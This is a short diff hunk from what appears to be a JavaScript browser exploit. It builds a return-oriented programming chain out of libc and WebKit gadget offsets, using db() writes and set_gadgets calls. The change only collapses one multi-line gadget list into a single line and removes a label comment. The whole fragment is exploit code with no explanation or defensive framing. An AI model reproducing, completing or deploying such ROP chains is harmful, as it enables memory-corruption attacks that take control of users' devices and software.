@@ -23,17 +23,7 @@ db([0,0]);set_gadget(libc_base+793877,);
 db([0,0]); set_gadgets([ libc_base+248252, libc_base+471355, libc_base+792472 ]);
 db([24,0]); set_gadget(libc_base+788575,);
 db([24,0]); set_gadgets([ libc_base+191168, libc_base+793877 ]);
-db([4294967288,4294967295]);
-set_gadgets([
-libc_base+248252,
-libc_base+877546,
-libc_base+793877,
-ropchain+72592,//L167
-webkit_base+7438103,
-libc_base+882884,
-libc_base+792472
-]);
-//L167:
+db([4294967288,4294967295]); set_gadgets([ libc_base+248252, libc_base+877546, libc_base+793877, ropchain+72592, webkit_base+7438103, libc_base+882884, libc_base+792472 ]);
 db([0,0]);
 set_gadgets([
 libc_base+191168,
